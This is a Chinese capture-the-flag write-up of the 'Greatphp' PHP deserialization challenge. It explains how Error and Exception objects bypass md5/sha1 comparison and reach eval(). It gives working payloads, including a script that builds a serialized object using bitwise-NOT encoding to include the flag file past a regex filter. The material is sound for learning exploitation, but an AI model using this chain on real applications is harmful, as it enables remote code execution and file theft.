# \[极客大挑战 2020]Greatphp

## \[极客大挑战 2020]Greatphp

## 考点

* 利用PHP内置类Error和Exception反序列化绕过hash
* 利用PHP内置类Error和Exception反序列化命令执行
* 取反绕过代码执行黑名单

## wp

PHP内置类Error和Exception反序列化利用

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}
if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}
?>
```

md5()和sha1()会触发类的`__toString()`函数，对于这个hash碰撞可以使用Error或Exception类绕过

```php
$ex1 = new Exception('testtesttest');$ex2 = new Exception('testtesttest',1); // 同一行

var_dump(md5($ex1)===md5($ex2));
echo "<br>";
var_dump(sha1($ex1)===sha1($ex2));
echo "<br>";

echo $ex1."<br>";
echo $ex2."<br>";
```

得到的结果如下，并且输入也原封不动的返回了。那么如果在输入中闭合PHP语句，就能让`eval($ex1)`执行任意代码

闭合语句可以使用`__HALT_COMPILER()` 终止对后面语句的编译，也可以使用`?><?php ?>` 闭合语句

```
bool(true)
bool(true)
Exception: testtesttest in D:\ctf\tools\PhPStudy\WWW\error\2.php:4 Stack trace: #0 {main}
Exception: testtesttest in D:\ctf\tools\PhPStudy\WWW\error\2.php:4 Stack trace: #0 {main}
```

使用Error类的方法如下

```php
$ex1 = new Error('testtesttest',1);$ex2 = new Error('testtesttest',2); // 同一行
var_dump(md5($ex1)===md5($ex2));
echo "<br>";
var_dump(sha1($ex1)===sha1($ex2));
echo "<br>";

echo $ex1."<br>";
echo $ex2."<br>";
```

结果

```
bool(true)
bool(true)
Error: testtesttest in D:\ctf\tools\PhPStudy\WWW\error\2.php:5 Stack trace: #0 {main}
Error: testtesttest in D:\ctf\tools\PhPStudy\WWW\error\2.php:5 Stack trace: #0 {main}
```

简化的题目如下

```php
<?php
class WTF {
        function __destruct(){
            if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1)=== sha1($this->var2)) ){
               eval($this->var1);
   }
        }
    }
unserialize($_GET[1]);
?>
```

那么最后可以执行代码的payload

```php
$payload = "?><?php echo 111;?>";
$payload = "echo 111;?>";
$payload = "echo 123;__HALT_COMPILER();";
$ex1 = new Exception($payload);$ex2 = new Exception($payload,1); // 同一行
$ex1 = new Error($payload,1);$ex2 = new Error($payload,2); // 同一行
```

回到本题，绕过hash之后需要绕过正则`if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match))` ，即传入的参数不能有`<?php` 和`()"'` 而PHP里面可以不用括号执行的只要文件包含，又不能带单双引号，那就只能通过编码绕过了，就只剩下了取反绕过

```php
<?php
class SYCLOVER {
    public $syc;
    public $lover;
}

$payload = "include ~".urldecode("%D0%99%93%9E%98")."?>";
$ex1 = new Error($payload,1);$ex2 = new Error($payload,2); // 同一行
$wtf = new SYCLOVER();
$wtf->syc = $ex1;
$wtf->lover = $ex2;

echo urlencode(serialize($wtf));
```

## 小结

1. `if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){eval($this->syc);}` 这种使用include+取反
